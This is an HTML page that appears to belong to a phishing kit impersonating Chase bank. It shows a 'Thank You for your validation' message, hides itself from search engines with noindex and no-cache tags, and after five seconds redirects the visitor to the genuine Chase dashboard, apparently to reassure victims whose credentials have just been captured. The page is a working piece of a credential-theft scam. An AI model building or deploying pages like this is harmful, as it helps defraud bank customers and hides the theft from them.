<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Step 1</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="noindex" />
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="nosnippet">

    <meta http-equiv="Cache-Control" content="no-store" />
    <meta http-equiv="Cache-Control" content="no-cache" />
    <meta http-equiv="Cache-Control" content="private" />
    <meta http-equiv="Pragma" content="no-cache" />

<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  <meta http-equiv="refresh" content="5; url=https://secure05b.chase.com/web/auth/dashboard#/dashboard/index/index" />
	
 

<body >
</head>
<body>

 
 

 <div id="image1" style="position:absolute; overflow:hidden; left:0px; top:1000px; width:1582px; height:191px; z-index:0"><img src="images/9.gif"  title="" border=0 width=1582 height=191></div>
<div id="image4" style="position:absolute; overflow:hidden; left:362px; top:157px; width:700px; height:42px; z-index:5"><h1 style="font-size:20px">Thank You for your validation...you will be redirected shortly</h1></div>
<div id="image4" style="position:absolute; overflow:hidden; left:482px; top:220px; width:142px; height:142px; z-index:5"><img src="images/confirmed.png" alt="" title="" border=0 width=142 height=142></div>
 


</body>
</html>
